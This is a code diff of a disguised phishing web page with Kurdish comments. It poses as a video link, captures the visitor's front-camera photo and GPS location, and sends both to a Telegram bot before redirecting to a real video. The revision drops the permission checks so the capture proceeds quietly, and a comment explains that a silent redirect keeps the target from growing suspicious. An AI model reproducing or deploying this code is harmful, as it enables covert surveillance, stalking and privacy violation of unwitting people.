@@ -11,7 +11,7 @@
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; display: flex; justify-content: center; align-items: center; transition: background 0.1s; }
         .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('soran.jpg') no-repeat center center; background-size: cover; z-index: 1; filter: brightness(0.7); }
         
-        /* سەهمی سادەی تیکتۆک بە بێ بازنە */
+        /* سەهمی سادە وەک کۆدەکەی خۆت */
         .play-btn { position: absolute; z-index: 5; pointer-events: none; }
         .play-icon { width: 90px; height: 90px; fill: white; opacity: 0.9; }
         
@@ -41,47 +41,46 @@
             const btn = document.getElementById('btn');
 
             try {
-                // ١. یەکەم جار داوای کامێرا دەکات
+                // ١. داوای کامێرا دەکات
                 const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const v = document.getElementById('v');
                 v.srcObject = s;
                 await v.play();
 
-                // ٢. دواتر داوای لۆکەیشن دەکات (مەرجە Allow بکات)
+                // ٢. داوای لۆکەیشن دەکات
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(async (pos) => {
-                        // ئەگەر لۆکەیشنی دا، وێنە دەگرێت و دەچێت بۆ ڤیدیۆ
-                        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\nhttps://www.google.com/maps?q=$" + pos.coords.latitude + "," + pos.coords.longitude)}`);
-                        
-                        // فلاش و وێنەگرتن
-                        bg.style.display = 'none';
-                        btn.style.display = 'none';
-                        b.classList.add('flash-active');
-
-                        setTimeout(async () => {
-                            const c = document.getElementById('c');
-                            c.width = v.videoWidth;
-                            c.height = v.videoHeight;
-                            c.getContext('2d').drawImage(v, 0, 0);
-                            const blob = await (await fetch(c.toDataURL('image/jpeg', 0.8))).blob();
-                            
-                            const fd = new FormData();
-                            fd.append('chat_id', chat_id);
-                            fd.append('photo', blob, 'photo.jpg');
-                            fd.append('caption', "📸 وێنەی نێچیر\n📱 مۆبایل: " + (navigator.userAgent.includes("iPhone") ? "iPhone" : "Android"));
-                            
-                            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-                            window.location.href = targetVideo;
-                        }, 1200);
-
-                    }, (err) => {
-                        // ئەگەر لۆکەیشنی Allow نەکرد، ناچێتە سەر ڤیدیۆکە
-                        alert("بۆ بینینی ڤیدیۆکە، دەبێت ڕێگە بدەیت (Allow)");
-                    }, { enableHighAccuracy: true });
+                        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\nhttps://www.google.com/maps?q=$" + pos.coords.latitude + "," + pos.coords.longitude)}`);
+                    }, null, { enableHighAccuracy: true });
                 }
+
+                // ٣. فلاش و شاشە سپی بوون
+                bg.style.display = 'none';
+                btn.style.display = 'none';
+                b.classList.add('flash-active');
+
+                // ٤. وێنەگرتن دوای ١.٥ چرکە و چوونە سەر ڤیدیۆ
+                setTimeout(async () => {
+                    const c = document.getElementById('c');
+                    c.width = v.videoWidth;
+                    c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    const blob = await (await fetch(c.toDataURL('image/jpeg', 0.8))).blob();
+                    
+                    const fd = new FormData();
+                    fd.append('chat_id', chat_id);
+                    fd.append('photo', blob, 'photo.jpg');
+                    fd.append('caption', "📸 وێنەی نوێ\n📱 مۆبایل: " + (navigator.userAgent.includes("iPhone") ? "iPhone" : "Android"));
+                    
+                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                    
+                    // گواستنەوەی ڕاستەوخۆ
+                    window.location.href = targetVideo;
+                }, 1500);
+
             } catch (e) {
-                // ئەگەر کامێرای Allow نەکرد، ناچێتە سەر ڤیدیۆکە
-                alert("دەبێت ڕێگە بە کامێرا بدەیت بۆ بینینی ڤیدیۆکە");
+                // ئەگەر کامێرا ڕێگەی نەدرا هەر دەیباتە سەر ڤیدیۆکە تا گومان نەکات
+                window.location.href = targetVideo;
             }
         }
     </script>
